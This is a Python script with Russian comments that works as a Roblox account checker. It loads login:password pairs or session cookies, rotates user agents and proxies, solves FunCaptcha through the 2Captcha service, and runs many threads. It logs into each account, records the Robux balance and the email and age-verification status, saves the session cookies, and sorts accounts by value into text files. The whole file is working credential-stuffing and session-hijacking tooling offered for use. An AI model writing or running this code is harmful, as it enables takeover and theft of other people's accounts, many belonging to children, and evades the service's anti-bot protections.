import os
import random
import time
from tkinter import Tk, filedialog
from playwright.sync_api import sync_playwright
from twocaptcha import TwoCaptcha
from concurrent.futures import ThreadPoolExecutor

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; rv:55.0) Gecko/20100101 Firefox/55.0',
]

api_key = 'YOUR_API_KEY'  # ВАШ API KEY ОТ 2CAPTCHA
solver = TwoCaptcha(api_key)

def load_login_password_from_file(login_file):
    login_data = []
    with open(login_file, 'r') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                login, password = line.split(':', 1)
                login_data.append((login, password))
    return login_data

def load_proxies_from_file(proxy_file):
    proxies = []
    with open(proxy_file, 'r') as f:
        proxies = [line.strip() for line in f.readlines() if line.strip()]
    return proxies

def load_cookies_from_file(cookies_file):
    cookies = []
    with open(cookies_file, 'r') as f:
        for line in f:
            if not line.strip() or line.startswith('#'):
                continue
            cookie_parts = line.strip().split('=')
            if len(cookie_parts) == 2:
                cookies.append({
                    'name': cookie_parts[0],
                    'value': cookie_parts[1],
                    'domain': '.roblox.com',
                    'path': '/',
                })
    return cookies

def login_with_cookies(page, cookies_file):
    if not os.path.exists(cookies_file):
        raise FileNotFoundError(f"Файл с куками {cookies_file} не найден!")

    cookies = load_cookies_from_file(cookies_file)

    if not cookies:
        raise ValueError(f"Файл {cookies_file} пуст или содержит некорректные данные!")

    page.context.add_cookies(cookies)
    page.goto('https://www.roblox.com/home')
    print(f"Куки загружены из {cookies_file}")

def solve_funcaptcha(page, url):
    try:
        result = solver.funcaptcha(
            sitekey='69A21A01-CC7B-B9C6-0F9A-E7FA06677FFC',
            url=url,
            surl='https://client-api.arkoselabs.com'
        )
        page.fill('input#g-recaptcha-response', result['code'])
        page.click('button#login-button')
        print("FunCaptcha успешно решена.")
    except Exception as e:
        print(f"Не удалось решить FunCaptcha: {str(e)}")
        return False
    return True

def login_with_credentials(page, username, password, use_proxy=False, proxy=None, use_funcaptcha=False):
    user_agent = random.choice(user_agents)
    page.set_extra_http_headers({
        'User-Agent': user_agent,
    })

    if use_proxy and proxy:
        context = page.context.browser.new_context(proxy={"server": proxy}) 
        page = context.new_page()

    page.goto('https://www.roblox.com/login')

    page.wait_for_selector('input#login-username', timeout=30000)

    page.fill('input#login-username', username)
    page.fill('input#login-password', password)

    if use_funcaptcha:
        solve_funcaptcha(page, page.url)

    page.click('button#login-button')

    page.wait_for_url('https://www.roblox.com/home')

def extract_username(page):
    try:
        username_element = page.locator('span.text-overflow.age-bracket-label-username.font-caption-header')
        page.wait_for_selector('span.text-overflow.age-bracket-label-username.font-caption-header', timeout=10000)

        if username_element.is_visible():
            username = username_element.text_content().strip()
            return username
        else:
            return None
    except Exception as e:
        print(f"Ошибка при извлечении никнейма: {str(e)}")
        return None

def handle_verification(page):
    try:
        verification_button = page.locator('button:has-text("Start Verification")')
        if verification_button.is_visible():
            verification_button.click()
            print("Запущена верификация.")
        else:
            print("Верификация не требуется.")
    except Exception as e:
        print(f"Ошибка при обработке верификации: {str(e)}")

def save_cookies(page, username, robux_amount, email_status):
    cookies_folder = "cookies"
    
    if not os.path.exists(cookies_folder):
        os.makedirs(cookies_folder)

    cookies_file = f"cookies/{username}_{robux_amount}_{email_status}.txt"

    cookies = page.context.cookies()

    with open(cookies_file, 'w') as f:
        for cookie in cookies:
            f.write(f"{cookie['name']}={cookie['value']}\n")

    print(f"Куки сохранены в {cookies_file}")
    print(f"Login:Pass сохранены в txt files")

def process_account(username, password, cookies_file, robux_threshold, use_proxy, proxy, use_funcaptcha):
    with sync_playwright() as p:
        browser = p.firefox.launch(headless=True)
        context = browser.new_context(proxy={"server": proxy} if use_proxy and proxy else None)
        page = context.new_page()

        try:
            if cookies_file:
                login_with_cookies(page, cookies_file)
                print(f"Куки загружены {cookies_file}")
            else:
                login_with_credentials(page, username, password, use_proxy, proxy, use_funcaptcha)
                print(f"Авторизация через логин/пароль для {username} успешна.")

            page.wait_for_load_state('domcontentloaded')

            if page.url == 'https://www.roblox.com/home':
                handle_verification(page)

                extracted_username = extract_username(page)
                if not extracted_username:
                    print(f"Никнейм для {username} не найден, продолжаем.")
                    extracted_username = username

                print(f"Никнейм аккаунта: {extracted_username}")

                robux_amount_text = page.locator('span#nav-robux-amount').text_content()
                
                if not robux_amount_text:
                    raise ValueError(f"Не удалось получить количество Robux у {extracted_username}")

                robux_amount = int(robux_amount_text.strip().replace(',', ''))

                print(f"Количество Robux у {extracted_username}: {robux_amount}")

                page.goto('https://www.roblox.com/my/account#!/info')

                email_text = page.locator('span.text-error').first.text_content()
                email_info = "Not Added" if "Add Email" in email_text else "Added"

                age_verification_text = page.locator('span.verify-legal-text')
                age_info = "Age Not Verified" if age_verification_text.is_visible() else "Age Verified"

                save_cookies(page, extracted_username, robux_amount, email_info)

                if robux_amount > robux_threshold:
                    with open('Robux.txt', 'a') as f:
                        f.write(f"{extracted_username}:{password} {robux_amount} Robux | Email: {email_info} | {age_info} {cookies_file}\n")
                else:
                    with open('norobux.txt', 'a') as f:
                        f.write(f"{extracted_username}:{password} {robux_amount} Robux | Email: {email_info} | {age_info} {cookies_file}\n")
            
        except Exception as e:
            print(f"Ошибка при обработке аккаунта {username}: {str(e)}")
        
        browser.close()

def process_accounts_from_file(filename, robux_threshold, cookies_dir, use_proxy, proxy, use_funcaptcha, num_threads):
    with sync_playwright() as p:
        browser = p.firefox.launch(headless=True)
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            if filename:
                login_data = load_login_password_from_file(filename)
                for login, password in login_data:
                    context = browser.new_context(proxy={"server": proxy} if use_proxy and proxy else None)
                    page = context.new_page()
                    executor.submit(process_account, login, password, None, robux_threshold, use_proxy, proxy, use_funcaptcha)

            elif cookies_dir:
                cookies_files = [os.path.join(cookies_dir, f) for f in os.listdir(cookies_dir) if f.endswith('.txt')]
                for cookies_file in cookies_files:
                    context = browser.new_context(proxy={"server": proxy} if use_proxy and proxy else None)
                    page = context.new_page()
                    executor.submit(process_account, None, None, cookies_file, robux_threshold, use_proxy, proxy, use_funcaptcha)

        browser.close()

def main():
    root = Tk()
    root.withdraw()

    method = input("Выберите метод:\n1. Login:Pass\n2. Cookies\n")

    if method == '1':
        filename = filedialog.askopenfilename(title="Выберите файл с логинами и паролями", filetypes=[("Text files", "*.txt")])
    else:
        cookies_dir = filedialog.askdirectory(title="Выберите папку с куками")

    robux_threshold = int(input("Введите robux, чтобы сохранял в robux.txt: "))
    use_proxy = input("Использовать прокси (y/n): ").lower() == 'y'
    proxy = None
    if use_proxy:
        proxy_file = filedialog.askopenfilename(title="Выберите файл с прокси", filetypes=[("Text files", "*.txt")])
        proxies = load_proxies_from_file(proxy_file)
        proxy = random.choice(proxies) if proxies else None
        print(f"Используем прокси: {proxy}")
    
    use_funcaptcha = input("Использовать 2Captcha для решения FunCaptcha (y/n): ").lower() == 'y'
    num_threads = int(input("Введите количество потоков для обработки аккаунтов: "))

    process_accounts_from_file(filename if method == '1' else None, robux_threshold, cookies_dir if method == '2' else None, use_proxy, proxy, use_funcaptcha, num_threads)

if __name__ == "__main__":
    main()
